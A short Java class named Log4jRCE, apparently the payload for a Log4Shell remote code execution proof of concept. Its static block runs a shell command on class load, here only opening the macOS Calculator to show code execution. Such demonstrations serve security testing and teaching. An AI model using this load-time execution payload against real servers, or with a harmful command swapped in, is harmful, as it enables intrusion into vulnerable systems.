import java.io.File;

public class Log4jRCE {
    static {
        try {
            File instFolder = new File("/System/Applications/Calculator.app");
            String[] cmd = new String[] { "open", instFolder.toString() };
            Runtime.getRuntime().exec(cmd).waitFor();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
